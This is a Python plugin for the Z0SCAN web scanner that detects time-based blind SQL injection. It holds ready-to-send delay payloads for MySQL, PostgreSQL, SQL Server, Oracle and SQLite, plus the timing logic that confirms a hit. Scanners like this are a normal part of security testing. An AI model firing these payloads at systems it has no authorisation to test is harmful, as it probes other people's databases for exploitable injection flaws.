#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Evi1ran November 17, 2020
# JiuZero 2025/7/29

import time
from helper.paramanalyzer import VulnDetector
from api import generateResponse, random_num, VulType, Type, PluginBase, conf, KB


class Z0SCAN(PluginBase):
    name = 'sqli-time'
    desc = "SQL Time-based Blind Injection"
    version = "2025.7.29"
    risk = 2
    
    sleep_time = 5
    sleep_str = "[SLEEP_TIME]"
    verify_count = 2

    def __init__(self):
        super().__init__()
        # 时间盲注概率计算相关参数
        self.TIME_THRESHOLD = 0.7  # 时间盲注概率阈值
        self.MIN_DELAY_RATIO = 0.8  # 最小延迟比率
        self.DBMS_CONFIDENCE = {
            "MySQL": 0.9,
            "Postgresql": 0.85,
            "Microsoft SQL Server or Sybase": 0.8,
            "Oracle": 0.75,
            "SQLite": 0.8
        }

    def calculate_time_probability(self, dbms_type, actual_delay, expected_delay):
        """
        计算时间盲注存在的概率（参考DetSQL）
        :param dbms_type: 数据库类型
        :param actual_delay: 实际延迟时间
        :param expected_delay: 预期延迟时间
        :return: 时间盲注存在的概率(0.0-1.0)
        """
        # 1. 基础概率基于数据库类型
        probability = self.DBMS_CONFIDENCE.get(dbms_type, 0.5)
        
        # 2. 计算延迟比率
        delay_ratio = actual_delay / expected_delay
        
        # 3. 按照DetSQL原有逻辑计算概率
        if delay_ratio >= self.MIN_DELAY_RATIO:
            # 情况1: 延迟比率接近1.0
            if delay_ratio >= 0.95:
                probability = min(probability + 0.3, 1.0)
            # 情况2: 延迟比率在合理范围内
            elif delay_ratio >= 0.8:
                probability = min(probability + 0.2, 1.0)
            # 情况3: 延迟比率较低但有明显延迟
            elif delay_ratio >= 0.5:
                probability = min(probability + 0.1, 1.0)
        
        return probability

    def generatePayloads(self, payloadTemplate):
        payload1 = payloadTemplate.replace(self.sleep_str, str(self.sleep_time))
        payload0 = payloadTemplate.replace(self.sleep_str, "0")
        return payload1, payload0
    
    def audit(self):
        if self.fingerprints.waf or conf.level == 0:
            return
        num = random_num(4)
        sql_times = {
            "MySQL": (
                " AND SLEEP({})".format(self.sleep_str),
                " AND SLEEP({})--+".format(self.sleep_str),
                "' AND SLEEP({})".format(self.sleep_str),
                "' AND SLEEP({})--+".format(self.sleep_str),
                "' AND SLEEP({}) AND '{}'='{}".format(self.sleep_str, num, num),
                # '''" AND SLEEP({}) AND "{}"="{}'''.format(self.sleep_str, num, num),
                ',(CASE WHEN ({}={}) THEN (SELECT SLEEP({})) ELSE id END)'.format(num, num, self.sleep_str),
            ), 
            "Postgresql": (
                "AND {}=(SELECT {} FROM PG_SLEEP({}))".format(num, num, self.sleep_str),
                "AND {}=(SELECT {} FROM PG_SLEEP({}))--+".format(num, num, self.sleep_str),
            ),
            "Microsoft SQL Server or Sybase": (
                " waitfor delay '0:0:{}'--+".format(self.sleep_str),
                "' waitfor delay '0:0:{}'--+".format(self.sleep_str),
                # '''" waitfor delay '0:0:{}'--+'''.format(self.sleep_str),
            ), 
            "Oracle": (
                " and 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})--+".format(self.sleep_str),
                "' and 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})--+".format(self.sleep_str),
                # '''"  and 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})--+'''.format(self.sleep_str),
                "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})".format(self.sleep_str),
                "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})--+".format(self.sleep_str),
            ), 
            "SQLite": (
                " AND 1=(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END)".format(num, num),
                " AND 1=(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END)--+".format(num, num),
                "' AND 1=(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END)".format(num, num),
                "' AND 1=(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END)--+".format(num, num),
                "' AND 1=(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END) AND '{}'='{}'".format(num, num, num, num),
                ",(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END)".format(num, num),
            ),
        }
        iterdatas = self.generateItemdatas()
    
        # 为了避免参数1的时间延迟干扰到参数2的检验，不做参数多线程
        for _ in iterdatas:
            k, v, position = _
            if not VulnDetector(self.requests.url).is_sql_injection(k, v):
                return
            for dbms_type, _payloads in sql_times.items():
                for payloadTemplate in _payloads:
                    r1 = r0 = None
                    delta = 0
                    flag = 0
                    p1, p0 = self.generatePayloads(payloadTemplate)
                    payload1 = self.insertPayload({
                        "key": k, 
                        "value": v, 
                        "position": position, 
                        "payload": p1
                        })
                    payload0 = self.insertPayload({
                        "key": k, 
                        "value": v, 
                        "position": position, 
                        "payload": p0
                        })
                    for i in range(self.verify_count):
                        start_time = time.perf_counter()
                        r1 = self.req(position, payload1)
                        if not r1:
                            continue
                        end_time_1 = time.perf_counter()
                        delta1 = end_time_1 - start_time
                        if delta1 > self.sleep_time:
                            r0 = self.req(position, payload0)
                            end_time_0 = time.perf_counter()
                            delta0 = end_time_0 - end_time_1
                            if delta1 > delta0 > 0:
                                flag += 1
                                delta = round(delta1 - delta0, 3)
                                continue
                        break

                    if r1 is not None and flag == self.verify_count:
                        # 计算时间盲注概率
                        probability = self.calculate_time_probability(dbms_type, delta, self.sleep_time)
                        result = self.generate_result()
                        result.main({
                            "type": Type.REQUEST, 
                            "url": self.requests.url, 
                            "vultype": VulType.SQLI, 
                            "show": {
                                "Position": f"{position} >> {k}",
                                "Payload": payload1, 
                                "Msg": "{}; Delay for {}s (Probability: {:.2f})".format(dbms_type, delta, probability)
                                }
                            })
                        result.step("Request1", {
                            "request": r1.reqinfo, 
                            "response": generateResponse(r1), 
                            "desc": "{}; Delay for {}s (Probability: {:.2f})".format(dbms_type, delta, probability)
                            })
                        self.success(result)
                        return